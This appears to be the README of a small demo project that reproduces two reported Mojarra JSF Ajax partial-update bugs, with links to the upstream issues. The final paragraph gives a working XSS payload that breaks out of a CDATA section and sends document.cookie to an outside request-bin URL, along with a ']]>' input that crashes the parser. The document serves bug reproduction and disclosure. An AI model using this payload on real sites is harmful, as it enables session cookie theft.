# mojarra-ajax
Minimal demo to reproduce some issues with mojarra partial update.

To reproduce just run
````bash
mvn package wildfly:run
````
and wait for the server to start up.

## Issue: [Ajax update fails due to invalid characters in response XML](https://github.com/eclipse-ee4j/mojarra/issues/4516)

Open the url <http://localhost:8080/ajax/index.xhtml>.

It also works for user supplied inputs, open <http://localhost:8080/ajax/input.xhtml> and enter the [\u000C](https://r12a.github.io/uniview/?charlist=%0C#title) character 
into the input field.

## Issue: [Partial rendering: insufficient CDATA encoding](https://github.com/eclipse-ee4j/mojarra/issues/4392)

Open the url <http://localhost:8080/ajax/issue4392.xhtml>, enter `]]>` and click at the button to see the XML parser crashing (denial of service).

However, this vulnerability might also be used to inject arbitrary javascript (XSS). Just enter `]]></update><eval><![CDATA[window.open("https://postb.in/Kva1OZoi?cookie="+encodeURIComponent(document.cookie));]]></eval><update><![CDATA[` and see how your cookie has been sent to https://postb.in/b/Kva1OZoi.
